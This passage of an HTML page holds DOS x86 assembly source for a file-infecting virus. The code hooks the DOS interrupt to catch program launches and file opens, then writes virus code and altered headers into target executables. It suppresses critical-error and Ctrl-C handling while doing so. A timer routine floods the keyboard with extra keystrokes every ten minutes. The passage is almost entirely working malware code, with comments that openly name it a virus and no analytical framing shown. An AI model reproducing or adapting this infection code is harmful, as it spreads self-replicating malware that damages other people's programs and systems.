int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Install New Timer-Tick Int</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,offset I21_dos12</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ah,30h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Get DOS-Version</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp al,3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Below 3.0?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jb DosBel3</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,offset new_I21&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No, new int</font>
<br><font color="#3333FF">DosBel3:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ax,2521h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Install new DOS-Int</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: NEW 1C (TIMER TICK) INTERRUPT ***</font>
<br><font color="#3333FF">; Every 10 minutes this routine sends during
2 sec. 180 extra keys to the</font>
<br><font color="#3333FF">; keyboard-interrupt.</font>
<p><font color="#3333FF">Ticks&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<p><font color="#3333FF">New_I1c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc word
ptr cs:[Ticks]&nbsp;&nbsp;&nbsp;&nbsp; ; Increment 'Ticks after virus loaded'</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp word ptr cs:[Ticks],2A30h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; 10 minutes passed?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jb org_I1c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No, go to orig. I1c</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp word ptr cs:[Ticks],2A54h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; 2 sec. passed?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jbe screw_keys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Not yet, give ESCs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov word ptr cs:[Ticks],0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Time-counter to 0</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp short Org_I1c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Go to orig. I1c</font>
<br><font color="#3333FF">Screw_Keys:&nbsp;&nbsp; push cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; 5 times / tick</font>
<br><font color="#3333FF">Put_Key:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Give extra key</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
loop Put_key</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop cx</font>
<br><font color="#3333FF">Org_I1c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db 0EAh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Jump far to orig. I1c</font>
<br><font color="#3333FF">I1c_Ofs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dw
(?)</font>
<br><font color="#3333FF">I1c_Seg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dw
(?)</font>
<p><font color="#3333FF">New_I24:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al,0</font>
<p><font color="#3333FF">New_I23:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iret</font>
<p><font color="#3333FF">I23_Ofs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dw
(?)</font>
<br><font color="#3333FF">I23_Seg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dw
(?)</font>
<p><font color="#3333FF">I24_Ofs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dw
(?)</font>
<br><font color="#3333FF">I24_Seg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dw
(?)</font>
<p><font color="#3333FF">ProgSize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dw (?)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Program size in paragraphs</font>
<p><font color="#3333FF">New_I21:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmp ax,4B00h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; New DOS Int for DOS 3 +</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz Is_Start</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp far dword ptr cs:[I21_Ofs]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Jmp orig. I 21</font>
<br><font color="#3333FF">Is_Start:&nbsp;&nbsp;&nbsp;&nbsp; call Save_Regs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call InstCritInt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Install new ^c and crit. err. int</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,3D02h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Open file for read and write</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ds,R_Ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc Close_File</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bx,ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Read_header</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc Close_File</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Write_virus</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc Close_File</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Write_header</font>
<br><font color="#3333FF">Close_File:&nbsp;&nbsp; mov ah,3Eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Close file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call RestCritInt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Restore ^c and crit-err ints</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Rst_regs_int</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp far dword ptr cs:[I21_Ofs]</font>
<p><font color="#3333FF">I21_Dos12:&nbsp;&nbsp;&nbsp; cmp ah,3Dh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; New DOS-Int for DOS 1.x and 2.x</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz Is_Open</font>
<p><font color="#3333FF">JmpDos:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db
0EAh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Jump Far</font>
<br><font color="#3333FF">I21_Ofs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dw
(?)</font>
<br><font color="#3333FF">I21_Seg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dw
(?)</font>
<p><font color="#3333FF">Is_Open:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Network-flags?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
and al,0FCh</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz JmpDos&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Yes -> DOS</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Save_Regs</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call InstCritInt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Install new ^c and crit. err. int</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov DS,R_Ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
or al,2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Write access</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pushf</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cli</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call far cs:[I21_Ofs]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Open file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc Open_Error&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Error opening -> DOS</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pushf</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov [R_Ax],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Save handle</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bx,ax</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Chk_Inf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Check infection is possible</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc No_Infect&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No -> quit</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Read_header</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc No_Infect</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Write_virus</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc No_Infect</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Write_header</font>
<br><font color="#3333FF">No_Infect:&nbsp;&nbsp;&nbsp; call Go_file_beg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Go to begin of file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call RestCritInt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Restore ^c and crit-err ints</font>
